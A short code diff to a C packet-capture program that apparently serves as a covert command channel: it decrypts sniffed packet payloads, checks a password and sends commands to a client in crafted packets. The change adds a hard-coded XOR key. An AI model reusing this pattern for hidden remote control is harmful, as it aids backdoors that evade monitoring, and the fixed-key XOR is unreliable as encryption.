@@ -1,4 +1,6 @@
 #include "pktcap.h"
+
+char xor_key[] = "7Zdl2saWXdZ43LR2LqEhK6JXmwYiw7P95PSA^/jJ(w7Zj,]MhAW6*@D<_:";
 /*--------------------------------------------------------------------------------------------------------------------
 -- FUNCTION: startPacketCapture
 -- 
@@ -163,6 +165,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
 	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 	/* Decrypt the payload */
+	iSeed(xor_key, 1);
 	decrypted = xor_cipher((char *)payload, size_payload);
 	
 	memset(password, 0, sizeof(password));
@@ -277,6 +280,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		//Encrypt payload
 		
 		//Send it over to the client
+		iSeed(xor_key, 1);
 		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src, dst, dest_port);
 		
 		memset(packet, 0, sizeof(packet));
